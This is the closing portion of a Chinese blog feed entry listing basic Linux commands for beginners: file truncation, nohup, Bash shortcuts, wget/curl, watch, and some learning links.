<p>清空文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:&gt; test.txt</div></pre></td></tr></table></figure></p>
<p>nohup输出重定向<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nohup python revice_true_link.py &gt; ./<span class="built_in">log</span>/true_link.log &amp;</div></pre></td></tr></table></figure></p>
<h4 id="Bash快捷键"><a href="#Bash快捷键" class="headerlink" title="Bash快捷键"></a>Bash快捷键</h4><ul>
<li>Ctl-U   删除光标到行首的所有字符,在某些设置下,删除全行</li>
<li>Ctl-W   删除当前光标到前边的最近一个空格之间的字符</li>
<li>Ctl-H   backspace,删除光标前边的字符</li>
<li>Ctl-R   匹配最相近的一个文件，然后输出</li>
<li>Ctl-a   光标移动到行首</li>
<li>Ctl-e   光标移动到行尾</li>
</ul>
<h4 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h4><p>访问远程资源，下载资源</p>
<ul>
<li>wget　　作用：下载远程文件  如：<a href="http://www.xxx.com/1.txt" target="_blank" rel="external">http://www.xxx.com/1.txt</a></li>
<li>curl　　作用：访问网页，返回包内容</li>
</ul>
<h4 id="程序运行"><a href="#程序运行" class="headerlink" title="程序运行"></a>程序运行</h4><ul>
<li>watch 运行的脚本 -n 秒数　　（几秒钟执行一次，不加n默认为2秒）</li>
<li>nohup 要运行的程序 &amp;　　(让程序在后台运行，忽略所有挂断信号)</li>
</ul>
<h3 id="Linux学习网站"><a href="#Linux学习网站" class="headerlink" title="Linux学习网站"></a>Linux学习网站</h3><ul>
<li><a href="http://linuxtools-rst.readthedocs.io/zh_CN/latest/" target="_blank" rel="external">http://linuxtools-rst.readthedocs.io/zh_CN/latest/</a></li>
<li><a href="http://man.linuxde.net/" target="_blank" rel="external">http://man.linuxde.net/</a></li>
</ul>
<h3 id="本文内容参考"><a href="#本文内容参考" class="headerlink" title="本文内容参考"></a>本文内容参考</h3><p><a href="http://linuxtools-rst.readthedocs.io/zh_CN/latest/" target="_blank" rel="external">http://linuxtools-rst.readthedocs.io/zh_CN/latest/</a></p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/08/09/2/">【玩转linux系统】Linux内网渗透</a><br><a href="https://thief.one/2017/08/09/1/">【玩转linux系列】Vim使用</a><br><a href="https://thief.one/2017/08/11/1/">【玩转linux系列】shell编程</a></p>
<p><em>注：本文内容部分来自互联网整理，部分来自个人经验总结；本文将持续收集更新，欢迎留言补充！</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;即使跌倒了，你要懂得抓一把沙子在手里。&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;　　随着对安全技术探索的逐步深入，我深刻体会到掌握linux系统对于安全研究的重要性。而掌握Linux系统首先必须得学会一些常用的linux命令，其次再去掌握一些linux常用工具，最后再是深入理解linux系统内核等。因此本篇作为该系列的第一篇，主要用来记录分享一些自己常用且基础的Linux命令。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
  </entry>
  
</feed>
